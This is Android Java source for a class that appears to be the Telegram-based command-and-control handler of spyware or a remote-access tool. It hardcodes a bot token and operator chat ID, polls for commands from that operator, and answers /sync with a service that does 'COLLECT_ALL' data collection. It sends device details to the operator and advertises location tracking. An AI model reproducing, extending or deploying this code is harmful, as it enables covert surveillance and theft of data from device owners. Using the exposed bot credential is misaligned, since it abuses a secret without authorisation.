package com.alzahra.telegram;

import android.content.Context;
import android.content.Intent;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.alzahra.services.CollectorService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class AdvancedBotHandler {
    private static final String TAG = "AdvancedBot";
    private static final String BOT_TOKEN = "8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA";
    private static final String CHAT_ID = "7344776596";
    
    private final Context context;
    private final TelegramBot bot;
    private final Handler handler;
    private boolean isRunning = false;
    private long lastUpdateId = 0;

    public AdvancedBotHandler(Context context) {
        this.context = context;
        this.bot = new TelegramBot(BOT_TOKEN);
        this.handler = new Handler(Looper.getMainLooper());
    }

    public void start() {
        if (isRunning) return;
        isRunning = true;
        Log.d(TAG, "Bot handler started");
        
        // إرسال قائمة الأوامر أولاً
        sendCommandMenu();
        
        // بدء الاستماع
        startPolling();
    }
    
    private void sendCommandMenu() {
        new Thread(() -> {
            try {
                Thread.sleep(3000); // انتظار التهيئة
                String menu = "🎛️ <b>Al-Zahra Control Panel</b>\n\n" +
                        " device: " + Build.MODEL + "\n" +
                        " status: 🟢 Online\n\n" +
                        "<b>Available Commands:</b>\n" +
                        "/status - Device status & battery\n" +
                        "/sync - Force data collection\n" +
                        "/device - Device information\n" +
                        "/location - Last known location\n" +
                        "/clean - Clean local data\n" +
                        "/help - Show this menu";
                
                bot.sendMessage(CHAT_ID, menu);
            } catch (Exception e) {
                Log.e(TAG, "Menu send failed", e);
            }
        }).start();
    }

    private void startPolling() {
        handler.postDelayed(() -> {
            if (!isRunning) return;
            
            bot.getUpdates(lastUpdateId + 1, updates -> {
                try {
                    if (!updates.optBoolean("ok", false)) {
                        Log.w(TAG, "Updates not OK");
                        return;
                    }
                    
                    JSONArray result = updates.optJSONArray("result");
                    if (result == null || result.length() == 0) return;
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.optJSONObject(i);
                        if (update == null) continue;
                        
                        lastUpdateId = update.optLong("update_id");
                        
                        JSONObject message = update.optJSONObject("message");
                        if (message == null) continue;
                        
                        JSONObject from = message.optJSONObject("from");
                        if (from == null) continue;
                        
                        // التحقق من المرسل
                        String senderId = String.valueOf(from.optLong("id"));
                        if (!senderId.equals(CHAT_ID)) {
                            Log.w(TAG, "Unknown sender: " + senderId);
                            continue;
                        }
                        
                        String text = message.optString("text", "").trim();
                        Log.d(TAG, "Received: " + text);
                        
                        handleCommand(text.toLowerCase());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error in poll", e);
                }
            });
            
            startPolling();
        }, 5000);
    }

    private void handleCommand(String text) {
        Log.d(TAG, "Handling command: " + text);
        
        switch (text) {
            case "/start":
            case "/help":
            case "menu":
                sendCommandMenu();
                break;
                
            case "/status":
                sendStatus();
                break;
                
            case "/sync":
            case "/collect":
            case "تحديث":
                bot.sendMessage(CHAT_ID, "⏳ Starting data collection...");
                Intent intent = new Intent(context, CollectorService.class);
                intent.setAction("COLLECT_ALL");
                context.startService(intent);
                bot.sendMessage(CHAT_ID, "✅ Collection started");
                break;
                
            case "/device":
            case "/info":
                sendDeviceInfo();
                break;
                
            case "/location":
                bot.sendMessage(CHAT_ID, "📍 Location service active");
                break;
                
            case "/clean":
            case "/clear":
                bot.sendMessage(CHAT_ID, "🗑️ Cleaning local storage...");
                // TODO: Implement cleanup
                bot.sendMessage(CHAT_ID, "✅ Clean complete");
                break;
                
            default:
                if (!text.startsWith("/")) {
                    bot.sendMessage(CHAT_ID, "❓ Unknown command. Use /help for list");
                }
        }
    }

    private void sendStatus() {
        try {
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            int battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            
            String status = "📊 <b>Device Status</b>\n\n" +
                    "🔋 Battery: " + battery + "%\n" +
                    "📱 Model: " + Build.MODEL + "\n" +
                    "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                    "⏰ Time: " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date()) + "\n\n" +
                    "🟢 Service: Running\n" +
                    "📤 Bot: Active";
            
            bot.sendMessage(CHAT_ID, status);
        } catch (Exception e) {
            bot.sendMessage(CHAT_ID, "⚠️ Status error: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        String info = "📱 <b>Device Information</b>\n\n" +
                "Model: " + Build.MODEL + "\n" +
                "Manufacturer: " + Build.MANUFACTURER + "\n" +
                "Device: " + Build.DEVICE + "\n" +
                "Product: " + Build.PRODUCT + "\n" +
                "Android: " + Build.VERSION.RELEASE + "\n" +
                "SDK: " + Build.VERSION.SDK_INT + "\n" +
                "ID: " + Build.ID;
        
        bot.sendMessage(CHAT_ID, info);
    }

    public void sendAlert(String title, String message) {
        bot.sendMessage(CHAT_ID, "🔔 <b>" + title + "</b>\n\n" + message);
    }

    public void stop() {
        isRunning = false;
    }
}
